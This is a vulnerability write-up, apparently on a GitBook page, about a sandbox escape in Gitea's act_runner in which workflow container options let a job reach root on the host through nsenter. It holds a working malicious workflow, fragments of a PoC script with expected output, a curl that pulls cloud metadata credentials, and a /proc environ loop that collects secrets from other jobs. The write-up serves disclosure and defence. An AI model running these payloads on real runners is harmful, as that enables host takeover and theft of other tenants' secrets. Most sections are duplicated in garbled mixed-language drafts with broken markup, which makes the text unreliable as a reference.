---
icon: gitlab
cover: ../.gitbook/assets/amw_pc (44).jpg
coverY: 366.8933177022275
coverHeight: 349
layout:
  width: default
  cover:
    visible: true
    size: full
    mask: none
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# Gitea2shell : Sandbox Escape to Host RCE

### CVE-2026-73802: Sandbox Escape to Host RCE

### Introduction

This writeup covers CVE-2026-73802, a Critical severity sandbox escape vulnerability in Gitea's `act_runner` the component responsible for executing Gitea Actions workflows. The vulnerability allows any workflow author to break out of the job container and execute arbitrary commands as root on the runner host machine, even when the runner operator has explicitly disabled privileged mode as a security control.

**CVE:** CVE-2026-73802 **CVSS:** 9.9 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) **Affected:** Gitea act\_runner < 3.0.0 **Fixed:** act\_runner 3.0.0 **Reporter:** sn0x-sharma **Advisory:** GHSA-x4q3-gcj3-m6cf **CWE:** CWE-269 (Improper Privilege Management)

This writeup covers CVE-2026-73802, a Critical severity sandbox escape in Gitea's `` `act_runner` the component responsible for executing Gitea Actions workflows. The vulnerability allows any workflow author to break out of the job container and execute arbitrary commands as root on the runner host, even when the runner operator has explicitly disabled privileged mode ``.

**CVE:** CVE-2026-73802 **CVSS:** 9.9 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) **Affected:** Gitea act\_runner < 3.0.0 **Fixed:** act\_runner 3.0.0 **Reporter:** sn0x-sharma (Sanket Sharma) **Advisory:** GHSA-x4q3-gcj3-m6cf

### Understanding the Components

Before diving into the vulnerability, it is important to understand the components involved and how they interact with each other.

#### Gitea Actions

Gitea Actions is an open-source alternative to GitHub Actions. When a developer pushes code to a repository, Gitea can trigger a workflow a YAML file that defines a sequence of tasks to run. These workflows are divided into **jobs**, and each job is executed on a **runner** machine.

#### act\_runner

`act_runner` is the binary that runs on the runner machine. It connects to the Gitea server, picks up workflow jobs, and executes them locally. It is built on top of the `nektos/act` library.

It supports two execution modes:

* **Direct mode:** Commands run directly on the host machine with no isolation
* **Docker mode:** Each job runs inside a freshly created Docker container, providing process and filesystem isolation from the host

#### Docker-backed Runners and the Privilege Model

<figure><img src="../.gitbook/assets/image (646).png" alt=""><figcaption></figcaption></figure>

In Docker mode, `act_runner` spins up a new container for each job. For security, runner operators set `privileged: false` in the runner configuration. This is meant to prevent the container from gaining full control over the host kernel a standard Docker hardening practice.

This setting gives administrators the impression that their runner is safely sandboxed. **That assumption was the root of the vulnerability.**

#### container.options The Attack Surface

Gitea Actions workflow YAML exposes a field called `container.options` under the job definition:

```yaml
jobs:
  my-job:
    container:
      image: ubuntu:22.04
      options: "--some-docker-flag"
```

This field allows a workflow author to pass additional Docker flags directly to the container creation call. It is **untrusted input** anyone who can submit or modify a workflow file can write arbitrary Docker flags here.

Before diving into the bug, it helps to understand the components involved and how they interact.

#### Gitea Actions

Gitea Actions **is an open-source alternative to GitHub Actions. When a developer pushes code, Gitea triggers a workflow a YAML file that defines what to run. Workflows are divided into jobs, and each job executes on a runner machine**.

#### act\_runner

`act_runner` is the binary running on the runner machine. It receives workflow jobs from the Gitea server and executes them. It is built on top of the `nektos/act` library.

It operates in two modes:

* **Direct mode:** Commands run directly on the host machine
* **Docker mode:** Each job runs in an isolated Docker container (the secure approach)

Two modes mein kaam karta hai:

* **Direct mode:** Commands directly host machine pe run hoti hain
* **Docker mode:** Har job ek isolated Docker container mein run hoti hai (secure approach)

#### Docker-backed Runners and the Privilege Model

``In Docker mode, `act_runner` spins up a fresh container for each job. For security, runner operators set `privileged: false` meaning the container does not get full access to the host``.

**This setting gives administrators the impression that their runner is sandboxed. That assumption was the vulnerability.**

#### container.options The Attack Surface

Gitea Actions workflow YAML exposes a field called \`container.options\` that passes Docker flags directly to the job container. This field is untrusted input anyone who can submit a workflow can write anything here.

```yaml
jobs:
  my-job:
    container:
      image: ubuntu:22.04
      options: "--some-docker-flag"
```

### The Vulnerability Root Cause

The bug is deceptively simple. When `act_runner` creates the job container, it forces `Privileged: false` and strips bind mounts but it passes everything else in `container.options` directly into the Docker `HostConfig` without any further filtering.

#### Source-to-Sink Code Path

Here is the full path from the workflow YAML to the running container:

<figure><img src="../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>

#### The Incomplete Sanitization

The administrator configured `privileged: false` and assumed:

> `Privileged: false` = the container is sandboxed

This assumption is incorrect. Docker container isolation is not controlled by a single flag it comes from multiple independent kernel mechanisms. Forcing `Privileged=false` only disables one of them. The table below shows exactly what `sanitizeConfig()` handled versus what it left exposed:

| Isolation Mechanism | Privileged=false handles it? | sanitizeConfig() filters it? |
| ------------------- | ---------------------------- | ---------------------------- |
| Privileged flag     | Yes Forced false             | N/A                          |
| Bind Mounts         | No                           | Filtered                     |
| PidMode=host        | No                           |  **Preserved - exploitable** |
| IpcMode=host        | No                           | **Preserved**                |
| CapAdd=ALL          | No                           | **Preserved**                |
| seccomp=unconfined  | No                           | **Preserved**                |
| apparmor=unconfined | No                           | **Preserved**                |

#### Why --pid=host Alone is Enough

Sharing the host PID namespace is sufficient on its own for a full host escape. When a container is started with `--pid=host`:

* Running `ps aux` from inside the container shows **all processes on the host**
* PID 1 is the host's own `init` or `systemd` process
* The `nsenter` utility can use any host PID as an entry point to jump into its namespaces
* `nsenter -t 1 -m -u -i -n -p` enters all six namespaces of PID 1 effectively placing you on the host

Adding `--cap-add=ALL`, `--security-opt seccomp=unconfined`, and `--security-opt apparmor=unconfined` removes every remaining kernel restriction, making the escape trivial and reliable.

``The bug is straightforward: when `act_runner` sanitizes `container.options`, it only strips two things bind mounts and volume mounts. Every other dangerous Docker flag passes through untouched into the final HostConfig``.

#### Source-to-Sink: Code Path

Here is the full code path from the workflow YAML to the running container:

<figure><img src="../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>

#### The Incomplete Fix Assumption

The administrator set \`privileged: false\` and assumed:

But Docker container isolation is not a single flag it comes from multiple independent mechanisms. Forcing \`Privileged=false\` only disables one of them. The table below shows what \`sanitizeConfig()\` actually handled

### The Attack Chain

#### Preconditions

To exploit this vulnerability, an attacker needs only:

* Gitea Actions is enabled on the target instance
* A Docker-backed `act_runner` is shared between multiple users or repositories
* The attacker has the ability to submit a workflow (direct repository access, a fork, or a branch push)
* The job container image contains `nsenter` - `ubuntu:22.04` includes it by default

#### Step 1 - Craft the Malicious Workflow

The attacker creates the following `.gitea/workflows/escape.yml` file and pushes it to any repository that uses the shared runner:

```yaml
name: escape-poc
on: [push]
jobs:
  breakout:
    runs-on: ubuntu-latest
    container:
      image: ubuntu:22.04
      options: >-
        --pid=host
        --ipc=host
        --cap-add=ALL
        --security-opt seccomp=unconfined
        --security-opt apparmor=unconfined
    steps:
      - name: host namespace escape
        run: |
          nsenter -t 1 -m -u -i -n -p -- sh -c "id > /tmp/pwned"
```

#### Step 2 - act\_runner Starts the Container

When the workflow triggers, `act_runner` calls Docker to create the job container. The effective `HostConfig` that Docker receives looks like this:

```
Docker HostConfig (as passed by act_runner):
  Privileged     = false              ← forced, as configured
  PidMode        = host               ← from container.options, preserved
  IpcMode        = host               ← from container.options, preserved
  CapAdd         = ["ALL"]            ← from container.options, preserved
  SecurityOpt    = ["seccomp=unconfined", "apparmor=unconfined"]
```

The container starts. The administrator sees `Privileged=false` in the Docker inspect output and assumes the container is sandboxed. It is not.

#### Step 3 - Entering Host Namespaces with nsenter

Inside the running container, the workflow step executes:

```bash
nsenter -t 1 -m -u -i -n -p -- sh -c "id > /tmp/pwned"
```

Here is what each flag does:

| Flag   | Meaning                                              |
| ------ | ---------------------------------------------------- |
| `-t 1` | Target PID 1 the host's init/systemd process         |
| `-m`   | Enter the mount namespace of PID 1 (host filesystem) |
| `-u`   | Enter the UTS namespace (host hostname)              |
| `-i`   | Enter the IPC namespace                              |
| `-n`   | Enter the network namespace (host networking)        |
| `-p`   | Enter the PID namespace                              |

This single command enters all six namespaces of PID 1. The shell that spawns is running **on the host**, not in the container. The container boundary has been fully crossed.

#### Step 4-  Root Shell on the Host

The command writes the output of `id` to `/tmp/pwned` on the **host filesystem**:

```
uid=0(root) gid=0(root) groups=0(root)
```

From this position, the attacker can:

* Read `/proc/<pid>/environ` of every running process → steal secrets from all concurrent jobs
* Access the host filesystem, SSH keys, and credentials
* Reach the Docker socket and spawn new containers
* Pivot to internal network services unreachable from outside the runner host
* Establish persistence via cron, systemd units, or authorized\_keys

#### Step 5 - Stealing Secrets from Adjacent Jobs (Shared Runner)

On a shared runner, multiple organizations' jobs run on the same host. The attacker's workflow can drain secrets from all of them simultaneously:

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

#### Preconditions

To exploit this, an attacker needs only:

* Gitea Actions enabled on the instance
* A Docker-backed `act_runner` that is shared between users
* The ability to submit a workflow (repository access or a fork)
* A job container image with `nsenter` present  `ubuntu:22.04` includes it by default
* Gitea Actions enabled ho
* Docker-backed act\_runner hो jo shared ho (multiple users ke workflows same runner pe chalte hain)
* Job container image mein `nsenter` ho (ubuntu:22.04 mein by default hota hai)
* Attacker apna workflow submit kar sake (repository access ya fork)

#### Step 1 - Malicious Workflow&#x20;

The attacker crafts the following workflow YAML:

```yaml
name: escape-poc
on: [push]
jobs:
  breakout:
    runs-on: ubuntu-latest
    container:
      image: ubuntu:22.04
      options: >-
        --pid=host
        --ipc=host
        --cap-add=ALL
        --security-opt seccomp=unconfined
        --security-opt apparmor=unconfined
    steps:
      - name: host namespace marker
        run: |
          nsenter -t 1 -m -u -i -n -p -- sh -c "id > /tmp/pwned"
```

#### Step 2 - Runner Container Start Hota Hai

W``hen the workflow triggers, `act_runner` starts a Docker container with the following effective HostConfig``:

```
Docker HostConfig (final, as passed by act_runner):
  Privileged     = false   ← forced, as expected
  PidMode        = host    ← FROM container.options, preserved
  IpcMode        = host    ← FROM container.options, preserved
  CapAdd         = [ALL]   ← FROM container.options, preserved
  SecurityOpt    = [seccomp=unconfined, apparmor=unconfined]
```

**The container starts. The admin sees \*\*Privileged=false\*\* and assumes everything is safe**.

#### Step 3 - nsenter se Host Namespace Entry

Inside the container, the workflow step runs:

```bash
nsenter -t 1 -m -u -i -n -p -- sh -c "id > /tmp/pwned"
```

`nsenter` flag breakdown:

* `-t 1` — target PID 1, the host's init/systemd process
* `-m` — enter host mount namespace
* `-u` — enter host UTS namespace
* `-i` — enter host IPC namespace
* `-n` — enter host network namespace
* `-p` — enter host PID namespace

This single command enters **all host namespaces** and executes the payload there — not inside the container.

* `-t 1` = target PID 1 (host ka init process)
* `-m` = mount namespace
* `-u` = UTS namespace (hostname)
* `-i` = IPC namespace
* `-n` = network namespace
* `-p` = PID namespace

Yeh command **host machine ke saare namespaces mein enter** karta hai aur wahan command execute karta hai.

#### Step 4 - Host pe Root Shell

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

The attacker now has root on the host machine. From here they can:

* Host ke environment variables padh sakta hai → **other jobs ke secrets, API keys, deploy credentials**
* Host filesystem access kar sakta hai
* Other containers (adjacent jobs) pe attack kar sakta hai
* Internal network pe pivot kar sakta hai
* Persistence establish kar sakta hai

#### Real World Impact Shared Runner Scenario

On a shared runner, the attack looks like this:

```
Runner Host Machine
├── Job A (Company X's deployment)    ← legitimate job
│   └── Has: AWS_SECRET_KEY, DB_PASSWORD
├── Job B (Company Y's build)         ← legitimate job  
│   └── Has: GITHUB_TOKEN, API_KEY
└── Job C (Attacker's workflow)       ← malicious
    └── nsenter → host root
        └── reads /proc/*/environ of Job A + Job B
            → steals ALL secrets from all concurrent jobs
```

### PoC Script Walkthrough

The proof-of-concept `poc.py` is a self-contained Python script (standard library only) that automates the full exploit chain: it generates a malicious workflow, executes it through `act_runner exec`, and verifies that a marker file was created on the **host** filesystem — confirming the container escape succeeded.

#### Usage

```bash
# Basic run
python3 poc.py --runner ./act_runner --image ubuntu:22.04

# Verbose output with act_runner debug logs
python3 poc.py --runner ./act_runner --image ubuntu:22.04 --debug

# Inspect the generated workflow after the run
python3 poc.py --runner ./act_runner --keep-workdir --debug
```

#### How the Script Works — Step by Step

**1. Input validation (`validate_marker`)**

```python
def validate_marker(marker):
    if not marker.startswith("/"):
        raise SystemExit("marker must be an absolute Linux path")
    if not re.fullmatch(r"[A-Za-z0-9._/\-]+", marker):
        raise SystemExit("marker contains unsupported characters")
```

The marker file path is validated to be an absolute Linux path containing only safe characters. The default marker path is `/tmp/gitea_act_runner_container_options_poc_marker`. If a pre-existing marker file is found, the script removes it before running so the result reflects this specific execution.

**2. Workflow generation (`write_workflow`)**

```python
DEFAULT_OPTIONS = "--pid=host --ipc=host --cap-add=ALL "\
                  "--security-opt seccomp=unconfined "\
                  "--security-opt apparmor=unconfined"

def write_workflow(root, marker, image):
    inner = f"id > {marker_q}; echo {shlex.quote(SUCCESS_TOKEN)} >> {marker_q}"
    command = f"nsenter -t 1 -m -u -i -n -p -- sh -c {shlex.quote(inner)}"
```

The script writes a valid `.gitea/workflows/poc.yml` into a temporary directory. The `nsenter` payload is safely shell-escaped using `shlex.quote()` to prevent any accidental shell injection in the generated YAML.

**3. Runner execution (`run`)**

```python
cmd = [
    args.runner, "exec",
    "-C", str(root),
    "-W", str(root / ".gitea" / "workflows"),
    "-j", "breakout",
    "--container-daemon-socket=-",   # Docker socket disabled
    "--image", args.image,
]
```

The key flag here is `--container-daemon-socket=-`. This tells `act_runner` **not** to bind-mount the Docker socket (`/var/run/docker.sock`) into the job container. This is intentional — it eliminates Docker-in-Docker (DinD) as a possible explanation for the escape. The exploit succeeds purely through namespace passthrough, with zero Docker socket access inside the container.

**4. Host marker verification (`read_marker`)**

```python
def read_marker(marker):
    return pathlib.Path(marker).read_text(encoding="utf-8", errors="replace")
```

After `act_runner` finishes, the script reads the marker file from the **host** path. If the file was created and contains the success token, the escape is confirmed:

```
uid=0(root) gid=0(root) groups=0(root)
gitea-act-runner-container-options-poc-ok
```

#### Expected Output on a Vulnerable System

```
[*] generated workflow: /tmp/gitea-act-runner-poc-xxxxx/.gitea/workflows/poc.yml
[*] running: ./act_runner exec -C /tmp/... -j breakout --container-daemon-socket=- ...
... (runner logs) ...
[+] verified host marker:
uid=0(root) gid=0(root) groups=0(root)
gitea-act-runner-container-options-poc-ok
```

#### Why the Docker Socket is Disabled

This is the most important design decision in the PoC. Docker socket access (`/var/run/docker.sock`) is a well-known, separate escape vector — if a container can reach the Docker socket, it can spawn privileged containers and escape trivially. By disabling it with `--container-daemon-socket=-`, the PoC proves that the escape happens **exclusively** through the `container.options` namespace passthrough bug. The root cause is in `sanitizeConfig()` leaving `PidMode`, `IpcMode`, `CapAdd`, and `SecurityOpt` fields unfiltered — nothing else.

``The PoC `poc.py` is a stdlib-only Python script that automatically generates a malicious workflow, runs it via `act_runner exec`, and verifies that a marker file was created on the host — confirming the escape succeeded``.

#### Usage

```bash
# Basic run
python3 poc.py --runner ./act_runner --image ubuntu:22.04

# Verbose output with debug
python3 poc.py --runner ./act_runner --image ubuntu:22.04 --debug

# Workflow directory inspect karne ke liye
python3 poc.py --runner ./act_runner --keep-workdir --debug
```

#### Script ka Flow - Step by Step

**1. Argument parsing and validation (`validate_marker`)**

```python
def validate_marker(marker):
    if not marker.startswith("/"):
        raise SystemExit("marker must be an absolute Linux path")
    if not re.fullmatch(r"[A-Za-z0-9._/\-]+", marker):
        raise SystemExit("marker contains unsupported characters")
```

`` The marker path is validated — only safe characters are allowed. Default: `/tmp/gitea_act_runner_container_options_poc_marker` ``

**2. Workflow generation (`write_workflow`)**

```python
DEFAULT_OPTIONS = "--pid=host --ipc=host --cap-add=ALL "
                  "--security-opt seccomp=unconfined "
                  "--security-opt apparmor=unconfined"

def write_workflow(root, marker, image):
    inner = f"id > {marker_q}; echo {shlex.quote(SUCCESS_TOKEN)} >> {marker_q}"
    command = f"nsenter -t 1 -m -u -i -n -p -- sh -c {shlex.quote(inner)}"
```

`` The script automatically writes `.gitea/workflows/poc.yml` into a temporary directory. The `nsenter` command is safely shell-escaped using `shlex.quote()` ``.

**3. Runner execution (`run`)**

```python
cmd = [
    args.runner, "exec",
    "-C", str(root),
    "-W", str(root / ".gitea" / "workflows"),
    "-j", "breakout",
    "--container-daemon-socket=-",  # ← important
    "--image", args.image,
]
```

``**`--container-daemon-socket=-` disables the Docker socket bind mount into the job container. This is intentional it rules out Docker socket abuse as the escape vector and proves the bug lives purely in namespace passthrough.``\*\*

* Agar Docker socket available hota toh koi argue kar sakta tha ki escape Docker socket se hua
* Socket disabled karne ke baad bhi escape hota hai → **confirms bug is in namespace handling, not socket**

**4. Marker verification (`read_marker`)**

```python
def read_marker(marker):
    return pathlib.Path(marker).read_text(encoding="utf-8")
```

``After the runner exits, the script reads `/tmp/gitea_act_runner_container_options_poc_marker` from the host. If it contains the success token, host namespace entry is confirmed.``

```
uid=0(root) gid=0(root) groups=0(root)
gitea-act-runner-container-options-poc-ok
```

If the file contains both lines, the sandbox escape is confirmed.

#### Expected Success Output

```
[*] generated workflow: /tmp/gitea-act-runner-poc-xxxxx/.gitea/workflows/poc.yml
[*] running: ./act_runner exec -C /tmp/... -j breakout --container-daemon-socket=- ...
... (runner logs) ...
[+] verified host marker:
uid=0(root) gid=0(root) groups=0(root)
gitea-act-runner-container-options-poc-ok
```

#### Key Design Decision — `--container-daemon-socket=-`

``This flag disables Docker socket access inside the job container — a separate, well-known attack vector (Docker-in-Docker). The PoC's purpose is specifically to demonstrate the `container.options` namespace passthrough bug. The escape still works with the socket disabled, which proves the root cause is in HostConfig option handling alone``.

### Real World Impact

#### Who is Affected?

**Critical severity Shared runners:** Any Gitea instance where multiple users or teams submit workflows to a shared Docker-backed runner. This is the default deployment model for self-hosted Gitea with open or semi-open registration, and for internal company instances where engineering teams share a common runner pool.

**High severity — Single-tenant runners:** Even private runners serving a single repository, where the operator set `privileged: false` believing the container was isolated. The attacker in this scenario may be the repository owner themselves — demonstrating that the security assumption of `privileged: false` is simply wrong without additional filtering.

#### What an Attacker Can Access

Once on the host as root, an attacker has access to:

```
Host Root Access
├── /proc/<pid>/environ     → Environment variables of every running process
│   ├── AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
│   ├── GITHUB_TOKEN, GITEA_TOKEN
│   ├── DATABASE_URL, DB_PASSWORD
│   └── Any secret injected as an env var into any job on this host
├── /etc/shadow             → System password hashes
├── ~/.ssh/                 → SSH private keys
├── /var/run/docker.sock    → Docker socket → spawn privileged containers
├── /var/lib/gitea/         → Gitea application data, tokens, configs
└── Host network stack      → Internal services, databases, cloud metadata endpoint
```

#### Cloud Metadata Credential Theft

If the runner is deployed on a cloud instance (AWS EC2, GCP Compute Engine, Azure VM), the attacker can reach the instance metadata endpoint directly from the host network namespace:

```bash
# Enter host network namespace from inside the container
nsenter -t 1 -m -u -i -n -p -- sh -c "
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
"
# Returns the IAM role name and temporary AWS credentials
# → Full cloud account access at the permissions level of the runner's IAM role
```

#### Stealing Secrets from All Concurrent Jobs

On a shared runner, all jobs running at the same time share the same host. A single malicious workflow can drain secrets from every concurrent job in one command:

```bash
nsenter -t 1 -m -u -i -n -p -- sh -c "
  for pid in /proc/[0-9]*; do
    cat \$pid/environ 2>/dev/null | tr '\0' '\n'
  done
"
# Outputs every environment variable from every process on the host
# including all secrets from all other jobs running at this moment
```

#### Who is Affected?

**\*\*Critical severity — Shared runners:\*\* Any Gitea instance where multiple users run workflows on a shared Docker runner. This includes self-hosted Gitea with open registration and internal company instances where teams share a singl**e runner.

\*\*``**High severity — Single-tenant runners:** Even private single-user runners where the admin set `privileged: false` believing the container was sandboxed. The attacker here is the repository owner themselves — breaking the security assumption of their own runner**``.

#### What an Attacker Gets

```
Host Root Access
├── /proc/<pid>/environ  → All environment variables of every process
│   ├── AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
│   ├── GITHUB_TOKEN, GITEA_TOKEN
│   ├── DATABASE_URL, DB_PASSWORD
│   └── Any secret passed as env var to any job
├── /etc/shadow          → Password hashes
├── ~/.ssh/              → SSH private keys
├── Docker socket        → Spin new containers, escape further
├── /var/lib/gitea/      → Gitea's own data, tokens, configs
└── Network access       → Internal services, databases, cloud metadata
```

#### Cloud Metadata Pivot

If the runner is on a cloud instance (AWS EC2, GCP, Azure):

```bash
# Container se host namespace enter karo
nsenter -t 1 -m -u -i -n -p -- sh -c "
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
"
# → AWS IAM role credentials milte hain → full cloud account access
```

#### Job Secret Theft

```bash
# Saare running processes ke environment variables dump karo
nsenter -t 1 -m -u -i -n -p -- sh -c "
  for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n'
  done
"
# Output mein doosre jobs ke secrets bhi hote hain
```

_\*Disclosure was handled responsibly the Gitea team was notified before public release and shipped the fix in act\_runner 3.0.0 before the advisory was published.\*_
